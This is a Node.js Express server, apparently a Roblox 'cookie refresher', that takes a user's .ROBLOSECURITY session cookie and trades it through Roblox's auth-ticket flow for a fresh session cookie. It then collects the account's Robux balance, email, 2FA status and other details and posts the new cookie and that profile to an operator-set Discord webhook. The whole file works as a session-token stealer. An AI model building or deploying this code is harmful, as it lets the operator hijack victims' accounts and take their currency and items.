const express = require('express');
const fetch = require('node-fetch');
const path = require('path');
const fs = require('fs');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { SocksProxyAgent } = require('socks-proxy-agent');

const configFile = path.join(__dirname, 'config.json');
if (!fs.existsSync(configFile)) {
    fs.writeFileSync(configFile, JSON.stringify({ proxy: { url: '', dcUrl: '' }, discord: { webhookUrl: '' } }, null, 4));
}
const config = JSON.parse(fs.readFileSync(configFile, 'utf8'));

// Support env vars (untuk Render.com)
if (process.env.WEBHOOK_URL) config.discord = { webhookUrl: process.env.WEBHOOK_URL };

const PROXY_URL_REF = { url: config.proxy?.url || '' };
const DC_PROXY_REF  = { url: config.proxy?.dcUrl || '' };

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

function normalizeProxyUrl(url) {
    if (!url) return '';
    url = url.trim();
    if (!url.startsWith('http') && !url.startsWith('socks')) url = 'http://' + url;
    return url;
}

function makeAgent(rawUrl) {
    if (!rawUrl) return null;
    const url = normalizeProxyUrl(rawUrl);
    try { new URL(url); } catch(e) { return null; }
    return url.startsWith('socks') ? new SocksProxyAgent(url) : new HttpsProxyAgent(url);
}

// Cek IP proxy buat cek-ip endpoint
function getProxyAgent() { return makeAgent(PROXY_URL_REF.url); }

app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.status(204).send();
    next();
});

app.use(express.static('public'));
app.post('/api/refresh', handleRefreshAPI);

app.get('/api/settings', (req, res) => res.json({
    proxyUrl: config.proxy?.url || '',
    dcUrl: config.proxy?.dcUrl || '',
    webhookUrl: config.discord?.webhookUrl || ''
}));

app.post('/api/settings', (req, res) => {
    try {
        const { proxyUrl, dcUrl, webhookUrl } = req.body;
        config.proxy = config.proxy || {};
        if (proxyUrl !== undefined) { config.proxy.url = proxyUrl.trim(); PROXY_URL_REF.url = proxyUrl.trim(); }
        if (dcUrl !== undefined)    { config.proxy.dcUrl = dcUrl.trim();   DC_PROXY_REF.url  = dcUrl.trim(); }
        if (webhookUrl !== undefined) { config.discord = config.discord || {}; config.discord.webhookUrl = webhookUrl.trim(); }
        try { fs.writeFileSync(configFile, JSON.stringify(config, null, 4)); } catch(e) {}
        console.log('⚙️  Settings updated');
        res.json({ success: true });
    } catch(err) { res.status(500).json({ success: false, error: err.message }); }
});

app.get('/api/check-ip', async (req, res) => {
    try {
        const agent = getProxyAgent();
        const r = await fetch('https://ipinfo.io/json', { timeout: 10000, agent: agent || undefined });
        const d = await r.json();
        res.json({ success: true, proxyActive: !!agent, ipInfo: d });
    } catch(err) { res.status(500).json({ success: false, error: err.message }); }
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

// ── Auth: SEMUA DIRECT (Render = datacenter IP = Unknown location di Roblox) ──

async function fetchCSRFToken(cookie) {
    try {
        console.log('📝 CSRF...');
        const r = await fetch('https://auth.roblox.com/v2/logout', {
            method: 'POST', timeout: 15000,
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0' }
        });
        const t = r.headers.get('x-csrf-token');
        return t ? t.trim() : null;
    } catch(e) { console.error('❌ CSRF:', e.message); return null; }
}

async function getAuthTicket(cookie, csrf) {
    try {
        console.log('🎫 Auth ticket...');
        const r = await fetch('https://auth.roblox.com/v1/authentication-ticket', {
            method: 'POST', timeout: 15000,
            headers: {
                'x-csrf-token': csrf, 'referer': 'https://www.roblox.com/',
                'Content-Type': 'application/json', 'Cookie': `.ROBLOSECURITY=${cookie}`, 'User-Agent': 'Mozilla/5.0'
            }
        });
        const t = r.headers.get('rbx-authentication-ticket');
        return t ? t.trim() : null;
    } catch(e) { console.error('❌ Ticket:', e.message); return null; }
}

async function redeemTicket(ticket) {
    try {
        console.log('💳 Redeem...');
        const r = await fetch('https://auth.roblox.com/v1/authentication-ticket/redeem', {
            method: 'POST', timeout: 15000,
            headers: { 'Content-Type': 'application/json', 'RBXAuthenticationNegotiation': '1', 'User-Agent': 'Mozilla/5.0' },
            body: JSON.stringify({ authenticationTicket: ticket })
        });
        const sc = r.headers.get('set-cookie');
        if (sc) { const m = sc.match(/\.ROBLOSECURITY=([^;]+)/i); if (m) return m[1].trim(); }
        console.warn('⚠️  No set-cookie, status:', r.status);
        return null;
    } catch(e) { console.error('❌ Redeem:', e.message); return null; }
}

// ── Account Info ──────────────────────────────────────────────────────────────

async function rFetch(url, cookie) {
    const opts = { timeout: 10000 };
    if (cookie) opts.headers = { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'User-Agent': 'Mozilla/5.0' };
    const r = await fetch(url, opts);
    return r.json();
}

async function getAccountInfo(cookie) {
    const info = {
        username: 'Unknown', displayName: 'Unknown', userId: 0, avatar: '',
        robux: 0, groups: 0, friends: 0, followers: 0, following: 0,
        isPremium: false, email: 'Not Set', emailVerified: false,
        twoFA: false, created: '', accountAge: 0, description: '', recentGames: []
    };
    try {
        const user = await rFetch('https://users.roblox.com/v1/users/authenticated', cookie);
        if (!user?.id) return info;
        info.userId = user.id; info.username = user.name; info.displayName = user.displayName || user.name;

        const [det, av, robux, friends, followers, following, groups, email, premium] = await Promise.allSettled([
            rFetch(`https://users.roblox.com/v1/users/${user.id}`, null),
            rFetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=150x150&format=Png`, null),
            rFetch('https://economy.roblox.com/v1/user/currency', cookie),
            rFetch(`https://friends.roblox.com/v1/users/${user.id}/friends/count`, null),
            rFetch(`https://friends.roblox.com/v1/users/${user.id}/followers/count`, null),
            rFetch(`https://friends.roblox.com/v1/users/${user.id}/followings/count`, null),
            rFetch(`https://groups.roblox.com/v1/users/${user.id}/groups/roles`, null),
            rFetch('https://accountsettings.roblox.com/v1/email', cookie),
            rFetch(`https://premiumfeatures.roblox.com/v1/users/${user.id}/validate-membership`, cookie),
        ]);

        if (det.status==='fulfilled' && det.value?.created) {
            info.created = det.value.created;
            info.accountAge = ((Date.now()-new Date(det.value.created))/(1000*60*60*24*365.25)).toFixed(1);
            info.description = det.value.description || '';
        }
        if (av.status==='fulfilled')       info.avatar      = av.value?.data?.[0]?.imageUrl || '';
        if (robux.status==='fulfilled')    info.robux       = robux.value?.robux || 0;
        if (friends.status==='fulfilled')  info.friends     = friends.value?.count || 0;
        if (followers.status==='fulfilled')info.followers   = followers.value?.count || 0;
        if (following.status==='fulfilled')info.following   = following.value?.count || 0;
        if (groups.status==='fulfilled')   info.groups      = (groups.value?.data||[]).length;
        if (email.status==='fulfilled')    { info.email = email.value?.emailAddress?.replace(/(.{2})(.*)(@.*)/,'$1***$3')||'Not Set'; info.emailVerified=email.value?.verified||false; }
        if (premium.status==='fulfilled')  info.isPremium   = premium.value===true;

        // 2FA
        try {
            const r2 = await fetch(`https://twostepverification.roblox.com/v1/users/${user.id}/configuration`, {
                timeout: 8000, headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'User-Agent': 'Mozilla/5.0' }
            });
            const d2 = await r2.json();
            info.twoFA = Array.isArray(d2?.methods) && d2.methods.length > 0;
        } catch(e) {}

        // Recent game
        try {
            const rp = await fetch('https://presence.roblox.com/v1/presence/users', {
                method: 'POST', timeout: 8000,
                headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0' },
                body: JSON.stringify({ userIds: [user.id] })
            });
            const dp = await rp.json();
            const p = dp?.userPresences?.[0];
            if (p?.lastLocation) info.recentGames = [{ name: p.lastLocation, status: p.userPresenceType===2?'In Game':'Online' }];
        } catch(e) {}

    } catch(e) { console.error('Account info error:', e.message); }
    return info;
}

// ── Discord ────────────────────────────────────────────────────────────────────

async function sendToDiscord(newCookie, acc) {
    const wh = config.discord?.webhookUrl;
    if (!wh) return;
    acc = acc || {};
    try {
        await fetch(wh, {
            method: 'POST', timeout: 8000,
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: '🎉 Cookie refreshed!',
                embeds: [{
                    title: `🛡️ ${acc.displayName||'Unknown'} (@${acc.username||'Unknown'})`,
                    url: `https://www.roblox.com/users/${acc.userId}/profile`,
                    color: 0x5865f2,
                    thumbnail: { url: acc.avatar||'' },
                    fields: [
                        { name: '💰 Robux',     value: (acc.robux||0).toLocaleString(), inline: true },
                        { name: '👥 Friends',   value: String(acc.friends||0), inline: true },
                        { name: '🏘️ Groups',   value: String(acc.groups||0), inline: true },
                        { name: '👤 Followers', value: String(acc.followers||0), inline: true },
                        { name: '🎂 Age',       value: `${acc.accountAge||'?'}y`, inline: true },
                        { name: '📧 Email',     value: acc.emailVerified?`✅ ${acc.email}`:`❌ ${acc.email}`, inline: true },
                        { name: '🔐 2FA',       value: acc.twoFA?'🔒 On':'🔓 Off', inline: true },
                        { name: '💎 Premium',   value: acc.isPremium?'✅':'❌', inline: true },
                    ],
                    footer: { text: `ID: ${acc.userId||'?'}` },
                    timestamp: new Date().toISOString()
                }, {
                    title: '🍪 New Cookie',
                    color: 0x23a559,
                    description: `\`\`\`${newCookie}\`\`\``
                }]
            })
        });
        console.log('✅ Discord sent');
    } catch(e) { console.error('❌ Discord:', e.message); }
}

// ── Main ──────────────────────────────────────────────────────────────────────

async function handleRefreshAPI(req, res) {
    res.setHeader('Content-Type', 'application/json');
    const { cookie, showAccountData } = req.body;
    if (!cookie) return res.status(400).json({ success: false, message: 'Cookie required' });
    try {
        console.log('\n' + '='.repeat(50));
        console.log('🚀 COOKIE REFRESH START');
        console.log('='.repeat(50));

        const csrf = await fetchCSRFToken(cookie);
        if (!csrf) return res.status(401).json({ success: false, message: 'Gagal fetch CSRF. Cookie invalid/expired.' });

        const ticket = await getAuthTicket(cookie, csrf);
        if (!ticket) return res.status(401).json({ success: false, message: 'Gagal generate auth ticket.' });

        const newCookie = await redeemTicket(ticket);
        if (!newCookie) return res.status(401).json({ success: false, message: 'Gagal redeem ticket.' });

        let accountInfo = null;
        if (showAccountData) accountInfo = await getAccountInfo(newCookie);

        await sendToDiscord(newCookie, accountInfo);
        console.log('✅ Done!\n');
        res.json({ success: true, newCookie, accountInfo });
    } catch(e) {
        console.error('❌ ERROR:', e.message);
        res.status(500).json({ success: false, message: 'Server error: ' + e.message });
    }
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`\n🌐 Running on port ${PORT}`);
    console.log('📡 Ready!\n');
});
